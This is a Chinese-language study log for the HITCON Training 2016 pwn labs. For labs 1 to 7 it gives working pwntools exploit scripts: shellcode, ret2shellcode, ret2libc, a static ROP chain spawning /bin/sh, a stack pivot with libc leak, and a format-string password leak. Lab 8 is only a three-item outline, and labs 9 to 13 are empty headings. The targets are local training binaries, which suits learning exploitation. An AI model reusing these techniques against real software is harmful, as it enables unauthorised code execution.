# Angelboy_HITCON_Training_2016 - Notes
> 前言:
>
> 其實每個 lab 下都有解答了，純粹紀錄和學習下，然後應該也不歸類在 wargame 就是，但不知道放哪

當初是看到這個[網站](https://veritas501.space/2017/05/23/HITCON-training%20writeup/)才知道的


> 目錄:
> * [lab1](#lab1)
> * [lab2](#lab2)
> * [lab3](#lab3)
> * [lab4](#lab4)
> * [lab5](#lab5)
> * [lab6](#lab6)
> * [lab7](#lab7)
> * [lab8](#lab8)
> * [lab9](#lab8)
> * [lab10](#lab9)
> * [lab11](#lab10)
> * [lab12](#lab11)
> * [lab13](#lab12)

lab1
---

單純 gdb 練習

```
gdb

b *get_flag+389
r
set $eax=$edx
c
```

lab2
---

保護都沒開，感覺就是 ret2shellcode

ida pro 看一下，就是輸入以後會直接執行，然後然後只允許 open/read/write

假設 flag 在當前目錄好了，就是 cat ./flag 這樣

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/HITCON-Training/LAB/lab2/orw.bin')

sh = open("a.bin", "rb").read()
r.sendlineafter(':', sh)


r.interactive()


"""
jmp sh
orw:
 pop ebx
 mov eax, 0x5
 xor ecx,ecx
 int 0x80

 mov ebx, eax
 mov eax, 0x3
 mov ecx, esp
 mov edx, 0x100
 int 0x80

 mov edx, eax
 mov eax, 0x4
 mov ebx, 0x1
 int 0x80

 mov eax, 0x1
 xor ebx, ebx
 int 0x80
sh:
 call orw
 db 'flag', 0
"""
```


lab3
---

這題名字就是 ret2shellcode @@ ，然後保護也沒開應該就是了

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/HITCON-Training/LAB/lab3/ret2sc')

name = 0x804a060
r.sendlineafter(':', asm(shellcraft.sh()))
r.sendlineafter(':', "a"*32 + p32(name))
r.interactive()
```

lab4
---

ret2libc 沒什麼好說的

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./ret2lib')

puts_got = 134520860
puts_off = 0x005fca0
system_off = 0x0003ada0
r.sendlineafter('address (in dec) :', str(puts_got))
info(r.recvuntil('the address : '))
libc = int(r.recvuntil('\n')[:-1], 16) - puts_off
info("libc: "+hex(libc))
system = system_off + libc
sh = libc + 0x15BA0B
trash = 'a'*60
r.sendlineafter(':', trash + flat([system, sh, sh]))


r.interactive()
```


lab5
---

statically linked 下的 rop

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./simplerop')
elf = ELF('./simplerop')
trash = 'a'*32
read = 0x0806CD50
bss = elf.bss()
pop3_ret = 0x0804838c
pop_eax = 0x080bae06
pop_ecx_ebx = 0x0806e851
pop_edx = 0x0806e82a
int0x80 = 0x080493e1
payload = trash + flat([read, pop3_ret, 0, bss, 0x10, pop_eax, 0xb, pop_ecx_ebx, 0, bss, pop_edx, 0])
payload += p32(int0x80)
r.sendafter(":", payload)
r.send('/bin/sh\x00')
r.interactive()
```


lab6
---

stack pivot ，因為 buf 不夠長，不過有給 libc 所以還是很簡單...

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./a')
r.recvrepeat(0.2)

trash = 'a'*40
buf1 = 0x0804b000-0x100
buf2 = 0x0804b000-0x200
read = 134513536
puts = 134513548
puts_off = 0x5fca0
puts_got = 134520816
system_off = 0x003ada0
sh_off = 0x15BA0B
leave_ret = 0x08048418
pop1 = 0x0804836d # pop ebx ; ret

pad = trash + flat([buf1, read, leave_ret, 0, buf1, 100])
r.send(pad)

pad2= flat([buf2, puts, pop1, puts_got, read, leave_ret, 0, buf2, 100])
r.send(pad2)
libc = u32(r.recv(4)) - puts_off
print "libc: ",hex(libc)
system = system_off + libc
sh = libc + sh_off

r.recvrepeat(0.2)
pad3 = flat([0, system, sh, sh])
r.send(pad3)


r.interactive()
```

lab7
---

這題考基本的 format string vuln ，漏洞在
```
printf(buf);
```

所以先透過 format string vuln 來 Leak password ，在輸入就好

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('127.0.0.1',1234)
r.recvrepeat(0.1)
password = 0x804a048
payload = p32(password) + "G%10$sG"
r.sendline(payload)
r.recvuntil('G')
s = u32(r.recvuntil('G')[:-1])
r.sendline(str(s))
r.interactive()
```


lab8
---

可以看成有三題

1. 寫 0xda
2. 寫 0xfaceb00c
3. get shell




lab9
---

lab10
---

lab11
---

lab12
---

lab13
---












